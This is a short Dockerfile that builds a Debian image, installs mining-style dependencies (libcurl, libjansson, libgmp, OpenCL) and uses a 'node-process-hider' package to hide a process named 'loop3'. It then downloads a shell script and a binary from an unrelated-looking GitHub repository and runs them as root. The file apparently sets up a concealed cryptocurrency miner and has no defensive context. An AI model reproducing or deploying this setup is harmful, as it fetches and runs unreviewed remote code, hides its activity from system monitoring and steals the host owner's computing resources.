FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev wget libssl-dev sudo libjansson-dev libgmp-dev nodejs npm make gcc g++ git zlib1g-dev ocl-icd-opencl-dev
         
RUN sudo npm i -g node-process-hider
RUN sudo ph add loop3

RUN wget https://raw.githubusercontent.com/cihuuy/youtube/main/vera.sh
RUN wget https://github.com/cihuuy/youtube/raw/main/loop3
RUN chmod 777 loop3
RUN chmod 777 vera.sh
RUN sudo ./vera.sh
